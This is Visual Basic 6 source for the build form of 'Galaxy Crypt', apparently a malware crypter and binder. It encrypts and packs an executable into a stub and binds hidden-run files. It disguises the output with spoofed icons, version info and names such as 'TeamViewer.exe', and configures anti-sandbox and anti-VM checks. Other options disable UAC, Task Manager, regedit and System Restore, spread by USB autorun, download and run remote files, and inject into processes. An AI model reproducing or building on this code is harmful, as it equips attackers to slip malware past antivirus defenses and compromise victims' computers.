VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.0#0"; "Codejock.Controls.v13.0.0.ocx"
Begin VB.Form Build 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   6000
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   11250
   Icon            =   "Build.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6000
   ScaleWidth      =   11250
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFF80&
      Height          =   3495
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   1440
      Visible         =   0   'False
      Width           =   6375
   End
   Begin XtremeSuiteControls.CheckBox CheckBox1 
      Height          =   195
      Left            =   7920
      TabIndex        =   3
      Top             =   4320
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox1"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.Label Label4 
      Height          =   255
      Left            =   8160
      TabIndex        =   4
      Top             =   4305
      Width           =   1935
      _Version        =   851968
      _ExtentX        =   3413
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Check For Updates"
      ForeColor       =   16777088
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.CommonDialog CdSave 
      Left            =   240
      Top             =   720
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.Label Label1 
      Height          =   255
      Left            =   1080
      TabIndex        =   2
      Top             =   5040
      Visible         =   0   'False
      Width           =   4455
      _Version        =   851968
      _ExtentX        =   7858
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "<<< Click to view build statistics >>>"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Alignment       =   2
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label7 
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   2895
      _Version        =   851968
      _ExtentX        =   5106
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Build Output File"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Simplified Arabic Fixed"
         Size            =   14.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin VB.Image Image7 
      Height          =   285
      Left            =   10400
      Picture         =   "Build.frx":F172
      Top             =   20
      Width           =   420
   End
   Begin VB.Image Image8 
      Height          =   285
      Left            =   10400
      Picture         =   "Build.frx":121F5
      Top             =   20
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.Image Image9 
      Height          =   285
      Left            =   10845
      Picture         =   "Build.frx":1536A
      Top             =   20
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.Image Image10 
      Height          =   285
      Left            =   10845
      Picture         =   "Build.frx":18762
      Top             =   20
      Width           =   420
   End
   Begin VB.Image Image3 
      Height          =   390
      Left            =   7920
      Picture         =   "Build.frx":1BB6D
      Top             =   3720
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image2 
      Height          =   390
      Left            =   7920
      Picture         =   "Build.frx":200EA
      Top             =   3720
      Width           =   1905
   End
   Begin VB.Image Image1 
      Height          =   6000
      Left            =   0
      Picture         =   "Build.frx":242E6
      Top             =   0
      Width           =   11250
   End
End
Attribute VB_Name = "Build"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
Private SettedX As Integer, SettedY As Integer, Dragging As Boolean

Const First_Split = "<h(#Uh(^hfd)"
Const Second_Split = "b/34y98~*N#4)8)"
Const Split_Main = "n*(#Hlkjt0ej"
Const Stub_Split = "#/#\#/#\"
Const Settings_Split = "B#dhl4jOl"
Const Begin_Split = "Ndkj*r34o(i>jdkj"
Const New_Split = "###"

' Declarations (Binder)
Dim ExtractPath As String, Num As Long, ExecuteAs As String, OutPutName As String, TempFile As String, TempUPX As String, FileDataPacked As String
Dim m_Record As Boolean

Private Sub Image1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dragging = False
End Sub

Private Sub Image1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
SettedX = X
    SettedY = Y
    Dragging = True
End Sub

Private Sub Image1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Visible = False
Image2.Visible = True
Image9.Visible = False
Image10.Visible = True
Image8.Visible = False
Image7.Visible = True

If Dragging Then
        Me.Left = Me.Left + (X - SettedX)
        Me.Top = Me.Top + (Y - SettedY)
    End If

End Sub

Function GetFilename(t$) As String
Dim i%, ct%
    GetFilename$ = t$
    i% = InStr(t$, "\")
    Do While i%
        ct% = i%
        i% = InStr(ct% + 1, t$, "\")
    Loop
    If ct% > 0 Then GetFilename$ = Mid$(t$, ct% + 1)
End Function

Private Sub form_load()

  
text1.Visible = True
text1.Text = Now & vbCrLf & vbCrLf
text1.Text = text1.Text & Time & vbCrLf & _
"Status: Ready to build" & vbCrLf & vbCrLf
Encryption_Key = Main.txtgenerate.Text

End Sub

Private Sub Retrieve_Settings()
On Local Error Resume Next
Dim i As Integer
NewLog 22

T1 = "tmp"
T2 = "ProgramFiles" '47
T3 = "SystemDrive" '48
T4 = "SystemRoot" '49
T5 = "AppData" '50
T6 = "\autorun.inf" '51
T7 = "Windir"   '52
T8 = "System32" '53

T9 = "SOFTWARE\Microsoft\Security Center"   '54
T10 = "UACDisableNotify"                    '55

T11 = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"    '56
T12 = "Shell_TrayWnd"                            '57
T13 = "\system32\msconfig.exe"                   '58
T14 = "winmgmts:\\.\root\default:SystemRestore"  '59
T15 = "urlmon"                                   '60
T16 = "URLDownloadToFileW"                       '61

' Fake Message
If Message.CheckBox7.Value = xtpChecked And Message.CheckBox8.Value = xtpUnchecked Then
Message_Play = 1
OutputLog 27, " True"
OutputLog 30, " Delayed"
NewLog 0
NewLog 2
End If

If Message.CheckBox7.Value = xtpChecked And Message.CheckBox8.Value = xtpChecked Then
Message_Play = 2
NewLog 0
NewLog 1
OutputLog 27, " True"
OutputLog 30, " On installation"
End If

Message_Body = Message.text1.Text
Message_Title = Message.ComboBox2.Text

If Message.CheckBox7.Value = xtpUnchecked Then
Message_Play = 0
GoTo DlyRun
End If

OutputLog 28
OutputLog 29

DlyRun:
' Delay Run
If Settings.CheckBox5.Value = xtpChecked Then
NewLog 6
DelayRunTime = Trim(Left(Settings.CBDelay.Text, 2)) * 1000
OutputLog 31
Else
DelayRunTime = 0
End If

EncMethod = Settings.ComboBox1.ListIndex

' Inject File

    If InStr(Stealth.FlatEdit2.Text, "Default browser ie C:\Program Files\Mozilla Firefox\Firefox.exe") Then
        Inject_Into = "1"
    Else
        Inject_Into = Stealth.FlatEdit2.Text
    End If
    
    With WebGet
        If .checkbox12.Value = True Then
                If .Rb1.Value = True Then InjDl = "C:\Windows\System32\Notepad.exe"
                If .Rb2.Value = True Then InjDl = "C:\Windows\System32\Taskmgr.exe"
                If .Rb3.Value = True Then InjDl = "Default Browser"
                If .Rb4.Value = True Then InjDl = .FlatEdit2.Text
        End If
    End With
    
        If WebGet.CheckBox13.Value = True Then
            If WebGet.RadioButton5.Value = True Then Exdl = "1"
            If WebGet.RadioButton6.Value = True Then Exdl = "2"
        End If
        
        If WebGet.Com1.ListIndex = 0 Then DelayDL = DelayDL * 1000
        If WebGet.Com1.ListIndex = 0 Then DelayDL = DelayDL * 60000
        If WebGet.Com1.ListIndex = 0 Then DelayDL = DelayDL * 3600000
           
    DisableTaskMgr1 = "REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
    DisableRegEdit1 = "REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_SZ /d 0 /f"
    
    ' 65
If WebGet.o1.Value = True Then Download_Directory = "1"
If WebGet.o2.Value = True Then Download_Directory = "2"
If WebGet.o3.Value = True Then Download_Directory = "3"
If WebGet.o4.Value = True Then Download_Directory = "4"
If WebGet.o5.Value = True Then Download_Directory = "5"
   
Download_Name = WebGet.FlatEdit1 & WebGet.Text5 'final_split(66)
    If InStr(Download_Name, ".exe") = 0 Then Download_Name = Download_Name & ".exe"
    
DlExt = WebGet.Text5.Text
DlURL = WebGet.TxtURL.Text

LaunchURL = Settings.CheckBox11.Value
VisitWeb = Settings.FlatEdit1.Text

pFilename = Stealth.FlatEdit1.Text
If Stealth.FlatEdit1.Text = "" Then pFilename = "TeamViewer.exe"
If Stealth.CheckBox10.Value = xtpChecked Then BundleStart = "1" Else BundleStart = "0"
If Settings.CheckBox10.Value = xtpChecked Then SpreadUSB = "1" Else SpreadUSB = 0

WriteIniValue App.Path & "\settings.ini", "settings", "Remember Settings", Settings.ChkRecord.Value

Call Record_Setting(11, Message.CheckBox7.Value)
Call Record_Setting(12, Message.CheckBox8.Value)
Call Record_Setting(13, Message.List1.ListIndex)
Call Record_Setting(17, Stealth.ComboBox1.ListIndex)
Call Record_Setting(15, Settings.CBDelay.ListIndex)
Call Record_Setting(16, Settings.CheckBox4.Value)
Call Record_Setting(25, WebGet.TxtURL.Text)
Call Record_Setting(26, WebGet.Text5.Text)
Call Record_Setting(27, WebGet.CheckBox9.Value)
Call Record_Setting(3, Antis.CheckBox1.Value)
Call Record_Setting(10, Antis.CheckBox2.Value)
Call Record_Setting(9, Antis.CheckBox3.Value)
Call Record_Setting(8, Antis.CheckBox4.Value)
Call Record_Setting(7, Antis.CheckBox5.Value)
Call Record_Setting(6, Antis.CheckBox6.Value)
Call Record_Setting(1, Antis.CheckBox7.Value)
Call Record_Setting(2, Antis.CheckBox9.Value)
Call Record_Setting(5, Antis.CheckBox10.Value)
Call Record_Setting(4, Antis.CheckBox11.Value)
Call Record_Setting(29, Stealth.CheckBox7.Value)
Call Record_Setting(28, Stealth.Text3.Text)
Call Record_Setting(20, Stealth.CheckBox6.Value)
Call Record_Setting(21, Stealth.CheckBox4.Value)
Call Record_Setting(22, Stealth.CheckBox2.Value)
Call Record_Setting(23, Stealth.CheckBox3.Value)
Call Record_Setting(24, Stealth.CheckBox1.Value)
Call Record_Setting(30, Stealth.CheckBox5.Value)
Call Record_Setting(31, VersionInfo.CD1.Filename)
Call Record_Setting(32, Settings.CheckBox10.Value)
Call Record_Setting(39, Main.FlatEdit1.Text)

Call Record_Setting(33, WebGet.FlatEdit1.Text)
Call Record_Setting(34, WebGet.Text5.Text)
Call Record_Setting(35, WebGet.FlatEdit3.Text)
Call Record_Setting(36, WebGet.Com1.ListIndex)
If WebGet.checkbox12.Value = True Then Call Record_Setting(37, "1") Else Call Record_Setting(37, "0")

End Sub
Private Sub Image10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image8.Visible = False
Image9.Visible = True
Image10.Visible = False
Image7.Visible = True
End Sub

Private Sub Image3_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Visible = True
Image3.Visible = False
End Sub
Private Sub Image3_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Visible = False
Image3.Visible = True

On Error Resume Next

Image3.Enabled = False
Image2.Enabled = False

Dim aFile As String, bFile As String, CryptedFile As String
Dim OutPutName As String, FileData As String, ReadFile As String
Dim i As Integer, FF As Long
Dim rc4 As New rc4, EncTea As New ClsTwofish
Dim Packer() As Byte, Packer1() As Byte

    FF = FreeFile
    
        If Settings.ChkRecord.Value = xtpChecked Then m_Record = True Else m_Record = False
    
    'Total Size
        Bnd_Out_Size = 0
        Build.Label1.Visible = False
            If Main.txtbrowse.Text = vbNullString Or Main.txtbrowse.Text = "Click to browse all files..." Then
                NewLog 19
                Image3.Enabled = True
                Image2.Enabled = True
                Exit Sub
            End If
            
    'Stub Exists
            If Fileexists(Main.FlatEdit1.Text) = False Then
                NewLog 39
                Image3.Enabled = True
                Image2.Enabled = True
                Exit Sub
            End If
    
    text1.Text = ""
    
    Packer = LoadResData("upx", "Custom")
    Packer1 = LoadResData(101, "Custom")
    
    TempUPX = Environ$("Temp") & "\TempUPX.exe"
    temp_fsg = Environ$("Temp") & "\TempFSG.exe"
    
    ' Put [UPX]
    Open TempUPX For Binary As #1
        Put #1, , Packer
    Close #1
    
    Open temp_fsg For Binary As #1
        Put #1, , Packer1
    Close #1
    
        With CdSave
            .DialogTitle = "Select a location for the output file..."
            .DefaultExt = "EXE Files (*.exe) |*.exe "
            .Filter = "EXE Files (*.exe) |*.exe "
            .ShowSave
        End With
        
        If CdSave.Filename = "" Then Exit Sub
    
    
    'Read EOF Data
    If Settings.CheckBox2.Value = xtpChecked Then
        NewLog 9
        NewLog 20
        OutputLog 3
        EOFFound = ReadEOFData(Main.txtbrowse.Text)
    End If
        NewLog 31
    
    ' Get Stub's Data
    FF = FreeFile
    Open User_Data For Binary As #FF
        aFile = String(LOF(FF), vbNullChar)
        Get #FF, , aFile
    Close #FF
    
    Open Main.txtbrowse.Text For Binary As #FF
        bFile = String(LOF(FF), vbNullChar)
        Get #FF, , bFile
    Close #FF
        NewLog 21
    
        If Settings.CheckBox1.Value = xtpChecked Then
            TempFile = Environ$("Temp") & "\Tempfile.exe"
    
            Open TempFile For Binary As #1
                Put #1, , bFile
            Close #1
    
            If Settings.CBCompress.ListIndex = 0 Then
                Shell TempUPX & " " & "-9" & " " & """" & TempFile & """", vbHide
                Sleep (6000)
            Else
                Shell temp_fsg & " " & TempFile, vbHide
                Sleep (6000)
            End If
    
            Open TempFile For Binary As #1
                bFile = String(LOF(1), vbNullChar)
                Get #1, , bFile
            Close #1
            
            Kill TempFile
            OutputLog 18
            OutputLog 19
            OutputLog 20
            
       ElseIf Stealth.CheckBox7.Value = xtpChecked Then
       
       Dim IntA As Long
       Dim IntB As String
       
                IntA = Stealth.Text3.Text
                
                If Stealth.ComboBox2.ListIndex = 0 Then IntB = Space(IntA)
                If Stealth.ComboBox2.ListIndex = 1 Then IntB = Space((IntA * 1000))
                If Stealth.ComboBox2.ListIndex = 2 Then IntB = Space((IntA * 1000000))
               
               
         Open Main.txtbrowse.Text For Binary As #1
            Put #1, LOF(1) + 1, IntB
        Close #1
       
                OutputLog 21
                Sleep (1000)
                
        Open Main.txtbrowse.Text For Binary As #FF
            bFile = String(LOF(FF), vbNullChar)
            Get #FF, , bFile
        Close #FF
                      
        End If
    
        Call Retrieve_Settings
            
            If Settings.ComboBox1.ListIndex = 0 Then
                NewLog 32
                bFile = rc4.EncryptString(bFile, Encryption_Key)
            Else
                NewLog 38
                bFile = EncTea.EncryptString(bFile, Encryption_Key)
            End If
            
            NewLog 12
           
    ' Transfer Stub --> Output [Server.exe]
    FF = FreeFile
    Open CdSave.Filename For Binary As #FF
        Put #FF, , aFile & Settings_Split
    
    
    
    ' Binder Code
    ' ******************************************************************************************************************
    'To Do: 1) Retrieve Stub's Data
    '       2) Open File in binary mode
    '       3) Open each listview item in binary mode
    '       4) Put both stub's data, each listview item's data into binary file
    '       5) Complete!
    ' *******************************************************************************************************************
    
    
    If Binder.ListView1.ListItems.Count <> 0 Then
    For i = 1 To Binder.ListView1.ListItems.Count
    
    ' Get Data Of Each File To Be Bound
        NewLog 37, i
    Open Binder.ListView1.ListItems(i).Text For Binary As #2
        FileData = Space(LOF(2))
        Get #2, , FileData
    Close #2
    
        ' Runtime Settings
        ExtractPath = Binder.ListView1.ListItems.Item(i).SubItems(1)
        ExecuteAs = Binder.ListView1.ListItems.Item(i).SubItems(2)
        OutPutName = Binder.ListView1.ListItems.Item(i).SubItems(4)
    
        ' Return numerical values for settings
        Call EvalSettings
        
        ' Compression [UPX]
        
        TempFile = Environ$("Temp") & "\Tempfile.exe"
        Open TempFile For Binary As #3
        Put #3, , FileData
        Close #3
        
    If Binder.ListView1.ListItems(i).SubItems(5) = "Yes" Then
        Shell """" & TempUPX & """ """ & TempFile & "", vbHide
        Sleep 2000
    End If
        
        Open TempFile For Binary As #3
            FileDataPacked = Space(LOF(3))
            Get #3, , FileDataPacked
        Close #3
    
    
    ' Encrypt Files Here
    
        If Binder.ListView1.ListItems.Item(i).SubItems(6) = "Yes" Then FileDataPacked = rc4.EncryptString(FileDataPacked, Encryption_Key)
        
    
        ' Data Transfer [Bound Files] --> Output File [Server.exe]
        Put #FF, , FileDataPacked & Settings_Split
        Put #FF, , Begin_Split & ExtractPath & New_Split & ExecuteAs & New_Split & OutPutName & New_Split & EncryptBound & New_Split
    
    Next i
    End If
    
        NewLog 33
        ' Data Transfer [Crypted File] --> Output File [Server.exe]
        Put #FF, , Split_Main & bFile & Split_Main
        Put #FF, , First_Split & Message_Play & Second_Split & Message_Title & Second_Split & Message_Body & Second_Split & Message_Icon & Second_Split & Encryption_Key & Second_Split & AntiSandbox & Second_Split & AntiVirtPC & Second_Split & AntiVirtBox & Second_Split & AntiVmWare & Second_Split & AntiAnubis & Second_Split & AntiJoeBox & Second_Split & AntiCws & Second_Split & AntiSunbelt & Second_Split & AntiPanda & Second_Split & AntiThreat & Second_Split & DelayRunTime & Second_Split & Inject_Into & Second_Split & DisableUAC & Second_Split & DisableTaskMgr & Second_Split & DisableRegEdit & Second_Split & DisableStart & Second_Split & DisableMsconfig & Second_Split & DisableSystemRestore & Second_Split & Message_Options & Second_Split & Melt_My_File & Second_Split & DlExt & Second_Split & DlURL & Second_Split & DownLoadFile & Second_Split & SpreadUSB & Second_Split & HardDrive & Second_Split & DllDet & Second_Split & Serials & Second_Split & WillStrUp & Second_Split & pFilename & Second_Split & Rdonly & _
                   Second_Split & SetHidden & Second_Split & BundleStart & Second_Split & LaunchURL & Second_Split & VisitWeb & Second_Split & EncMethod & Second_Split & DisableTaskMgr1 & Second_Split & InjDl & Second_Split & Download_Directory & Second_Split & Download_Name & Second_Split & Exdl & Second_Split & DelayDL & Second_Split & T1 & Second_Split & T2 & Second_Split & T3 & Second_Split & T4 & Second_Split & T5 & Second_Split & T6 & Second_Split & T7 & Second_Split & T8 & Second_Split & T9 & Second_Split & T10 & Second_Split & T11 & Second_Split & T12 & Second_Split & T13 & Second_Split & T14 & Second_Split & T15 & Second_Split & T16
                              
 '    DelayDL 45
 
    Close #FF
    
        NewLog ((23))
    
      NewLog 10
        
              
      NewLog 34
      
     
    ' Update Version Info
    If VersionInfo.CheckBox2.Value = xtpChecked Then
        VersionInfo.InputVersionInfo (CdSave.Filename)
        OutputLog 36
        For i = 4 To 13
        OutputLog (i)
        Next i
    End If
    
        ' Patch EOF Data
         If Settings.CheckBox2.Value = xtpChecked Then
           
              Call WriteEOFData(CdSave.Filename, EOFFound)
                
         End If
        
        'Change Icon
    If Settings.CheckBox8.Value = xtpChecked Then
        NewLog 35
        If Settings.CheckBox6.Value = True Then
            DoEvents
            Call ResToFile("Reshacker", "src")
            Shell (Environ$("Temp") & "\src.exe -addoverwrite " & CdSave.Filename & "," & CdSave.Filename & "," & Settings.text1.Text & ",ICONGROUP,1,0")
        
        Else
            DoEvents
            NewLog 8
            Shell (Environ$("Temp") & "\Src.exe -delete " & CdSave.Filename & "," & CdSave.Filename & ",ICONGROUP,,")
            Shell (Environ$("Temp") & "\Src.exe -addoverwrite " & CdSave.Filename & "," & CdSave.Filename & "," & Environ$("Temp") & "\Icon_1.ico" & ",ICONGROUP,1,")
                
        End If
            Sleep (2000)
            NewLog 7
            OutputLog 24
    End If
            
    DoEvents
    If Settings.CheckBox3.Value = xtpChecked Then
        NewLog 11
        Open CdSave.Filename For Binary As #1
                FinalData = Space(LOF(1))
            Get #1, , FinalData
        Close #1
        
        Call AddSection(CdSave.Filename, ".jk3", Len(FinalData), &H8000000F)
        NewLog 30
        For i = 14 To 17
        OutputLog i
        Next i
        
    End If
            
            
    ' Determine Total Size
    For i = 1 To Binder.ListView1.ListItems.Count
        Bnd_Out_Size = Bnd_Out_Size + FileLen(Binder.ListView1.ListItems(i).Text)
    Next i
    
    Bnd_Out_Size = Bnd_Out_Size + FileLen(Main.txtbrowse.Text)
    ' Add To Build Log
    
    If Binder.ListView1.ListItems.Count <> 0 Then
        NewLog (27)
        NewLog (17)
        NewLog (18)
        NewLog (25)
        NewLog (14)
        
        DoEvents
        If Fileexists(TempFile) Then Kill TempFile
    
    Else
    
        NewLog 26
        NewLog 15
        NewLog 16
        NewLog 14
        
    End If
    
    
            'Clean output field
        Call DeleteRes
        OutputLog 33
        OutputLog 34
        OutputLog 35
        Build.Label1.Visible = True
    
    Image3.Enabled = True
    Image2.Enabled = True
    
        If CheckBox1.Value = xtpChecked Then
            Me.Hide
            Updates.Visible = True
        End If


End Sub

Private Sub EvalSettings()
If ExtractPath = "Application Directory " Then ExtractPath = "1"
If ExtractPath = "Windows Directory " Then ExtractPath = "2"
If ExtractPath = "System Directory " Then ExtractPath = "3)"
If ExtractPath = "Temp Directory " Then ExtractPath = "4"
If ExtractPath = "AppData (Documents & Settings) " Then ExtractPath = "5"
If ExtractPath = "System 32" Then ExtractPath = "6"
If ExtractPath = "Program Files" Then ExtractPath = "7"

If ExecuteAs = "Shell Execute As Normal" Then ExecuteAs = 1
If ExecuteAs = "Shell Execute As Hidden" Then ExecuteAs = 2
If ExecuteAs = "Do Not Execute File" Then ExecuteAs = 3
If Binder.CheckBox1.Value = xtpChecked Then ExecuteAs = 4

End Sub
Private Sub Image7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image9.Visible = False
Image8.Visible = True
Image7.Visible = False
Image10.Visible = True
End Sub
Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Visible = True
Image2.Visible = False
End Sub

Function LoadFile(file As String) As String
On Error GoTo Err
Open file For Binary As #1
LoadFile = Space(LOF(1))
Get #1, , LoadFile
Close #1
Exit Function
Err:
Debug.Print Err.Description, Err.Number
End Function

Private Sub Image8_Click()
Me.WindowState = vbMinimized
End Sub

Private Sub Image9_Click()
Me.Hide
End Sub

Private Sub Label1_Click()
Statistics.Show
End Sub

Private Sub Text1_Change()
text1.SelStart = Len(text1.Text)
End Sub

Private Function GetFlName(ByVal InFile As String) As String
On Error GoTo error:
Dim AppExeName() As String
AppExeName = Split(InFile, "\")
GetFlName = AppExeName(UBound(AppExeName))
Exit Function
error:
GetFlName = vbNullString
End Function
Function NewLog(ByVal LogMsg As Integer, Optional Number As Integer)
On Local Error Resume Next

LogMsgArray(0) = "Fake message enabled"
LogMsgArray(1) = "Message will run on installation"
LogMsgArray(2) = "Message will be delayed"
LogMsgArray(3) = "Version info altered"
LogMsgArray(4) = "Version info unchanged"
LogMsgArray(5) = "Output file successfully compressed using UPX"
LogMsgArray(6) = "Output file will be delayed during for" & Settings.CBDelay.Text & "during runtime"
LogMsgArray(7) = "Output file's icon had been altered"
LogMsgArray(8) = "Output file's icon has been replaced with that of " & Mid(GetFlName(Settings.CDIcon.Filename), 1, InStr(GetFlName(Settings.CDIcon.Filename), ".") - 1) & "'s"
LogMsgArray(9) = "End of file data has been read"
LogMsgArray(10) = "Preserving end of file data"
LogMsgArray(11) = "Adding New section to the output file"
LogMsgArray(12) = "Encryption Successfull"
LogMsgArray(13) = "Output file will be melted upon runtime"
LogMsgArray(14) = "Thank you for using Galaxy Crypt"
LogMsgArray(15) = "Output file can be located at: " & CdSave.Filename
LogMsgArray(16) = "The size of the output file is: " & FormatKB(FileLen(CdSave.Filename))
LogMsgArray(17) = "Output file has been bound with " & Binder.ListView1.ListItems.Count & "files"
LogMsgArray(18) = "Bound file can be located at: " & CdSave.Filename
LogMsgArray(19) = "Error! Could not locate the source file"
LogMsgArray(20) = "Data Found: " & Len(ReadEOFData(Main.txtbrowse.Text))
LogMsgArray(21) = "Preparing file for the encryption process"
LogMsgArray(22) = "Reading selected runtime settings"
LogMsgArray(23) = "The settings transfer was a success"
LogMsgArray(24) = "Preparing files for binding process"
LogMsgArray(25) = "The binding process was a success!"
LogMsgArray(26) = "The encryption process was a success!"
LogMsgArray(27) = "The size of the output file is: " & FormatKB(Bnd_Out_Size)
LogMsgArray(28) = "Output file has been compressed with UPX"
LogMsgArray(29) = "Output file has been compressed with Huffman"
LogMsgArray(30) = "New Section has been successfully added to the output file"
LogMsgArray(31) = "Browsing " & App.Path & " for stub file"
LogMsgArray(32) = "Encrypting " & GetFlName(Main.txtbrowse.Text) & " using RC4"
LogMsgArray(33) = "Transferring settings to " & GetFlName(CdSave.Filename)
LogMsgArray(34) = "Altering output file's version information"
LogMsgArray(35) = "Changing the icon of: " & GetFlName(CdSave.Filename)
LogMsgArray(36) = "Loading icon from " & Settings.text1.Text
LogMsgArray(37) = "Retreiving settings from " & Number & " of " & Binder.ListView1.ListItems.Count
LogMsgArray(38) = "Encrypting " & GetFlName(Main.txtbrowse.Text) & " using Tea Algorithm"
LogMsgArray(39) = "Error! Could not locate the stub file"

If LogMsg <> 14 Then
Build.text1.Text = Build.text1.Text & vbCrLf
Build.text1.Text = Build.text1.Text & LogMsgArray(LogMsg) & "..."
Delay (RndDecimal)
Else
Build.text1.Text = Build.text1.Text & vbCrLf
Build.text1.Text = Build.text1.Text & LogMsgArray(LogMsg)
Delay (RndDecimal)
End If

End Function

Public Sub OutputLog(ByVal MsgNumber As Integer, Optional SubMsg As String)
Dim StatMessage(50) As String
On Local Error Resume Next

StatMessage(1) = "Output Filename: " & GetFlName(CdSave.Filename)
StatMessage(2) = "Size of Crypted data: " & FormatKB(FileLen(CdSave.Filename))
StatMessage(3) = "End of file data patched: " & Len(ReadEOFData(Main.CD1.Filename)) & " Bytes"
StatMessage(4) = "File Version: " & VersionInfo.text1.Text
StatMessage(5) = "File Desccription: " & VersionInfo.Text2.Text
StatMessage(6) = "Legal Copyright: " & VersionInfo.Text3.Text
StatMessage(7) = "Comments: " & VersionInfo.Text4.Text
StatMessage(8) = "Company Name: " & VersionInfo.Text5.Text
StatMessage(9) = "Legal Trademarks: " & VersionInfo.Text6.Text
StatMessage(10) = "Product Name: " & VersionInfo.Text7.Text
StatMessage(11) = "Product Version: " & VersionInfo.Text8.Text
StatMessage(12) = "Contact: " & VersionInfo.Text9.Text
StatMessage(13) = "Internal Name: " & VersionInfo.Text10.Text
StatMessage(14) = vbCrLf & "New Section Information: "
StatMessage(15) = "Size: " & FormatKB(Len(FinalData) / 2)
StatMessage(16) = "Name: " & ".jk3"
StatMessage(17) = "Characteristics: " & "&H8000000F"
StatMessage(18) = vbCrLf & "File Compressed"
StatMessage(19) = "Compressed ratio: " & "30%"
StatMessage(20) = "Compressed using UPX"
StatMessage(21) = vbCrLf & "Bytes Added: " & Num
StatMessage(22) = vbCrLf & "Icon Changed: " & "Yes!"
StatMessage(23) = "Program used: " & "Resource Hacker"
StatMessage(24) = "Icon Source: " & Settings.CDIcon.Filename
StatMessage(25) = vbCrLf & "Sandboxes Activated: "
StatMessage(26) = vbCrLf & "Stealth Settings Used: "
StatMessage(27) = vbCrLf & "Fake Message Activated: "
StatMessage(28) = "Message: " & Message.text1.Text
StatMessage(29) = "Message Title: " & Message.ComboBox2.Text
StatMessage(30) = "Play Style : "
StatMessage(31) = vbCrLf & "Delay Installation: " & Settings.CBDelay.Text
StatMessage(32) = vbCrLf & "Encryption Key: " & Main.txtgenerate.Text
StatMessage(33) = vbCrLf & "File Binder: "
StatMessage(34) = "Files Bound: " & Binder.ListView1.ListItems.Count
StatMessage(35) = "Bound Size: " & FormatKB(Bnd_Out_Size)
StatMessage(36) = vbCrLf & "File Information: "

With Statistics.FlatEdit1
.Text = .Text & vbCrLf
.Text = .Text & StatMessage(MsgNumber) & SubMsg
End With

End Sub

Private Sub Write_Ini(ByVal Message As String, Value As String)

    WriteIniValue App.Path & "\Settings.ini", "Settings Values", Message, Value


End Sub


Private Sub DeleteRes()

DoEvents
    If Fileexists(Environ("Temp") & "\ico.rc") Then Kill Environ("Temp") & "\ico.rc"
DoEvents
   If Fileexists(Environ("Temp") & "\src.ini") Then Kill Environ("Temp") & "\src.ini"
DoEvents
   If Fileexists(Environ("Temp") & "\src.log") Then Kill Environ("Temp") & "\src.log"
DoEvents
   If Fileexists(Environ("Temp") & "\Icon_*.ico") Then Kill Environ("Temp") & "\Icon_*.ico"
DoEvents
   If Fileexists(Environ("Temp") & "\src.exe") Then Kill Environ("Temp") & "\src.exe"
DoEvents
   If Fileexists(TempUPX) Then Kill TempUPX
DoEvents
  
End Sub

Public Function Fileexists(fName) As Boolean
   If Dir(fName) <> "" Then _
   Fileexists = True _
   Else Fileexists = False
End Function

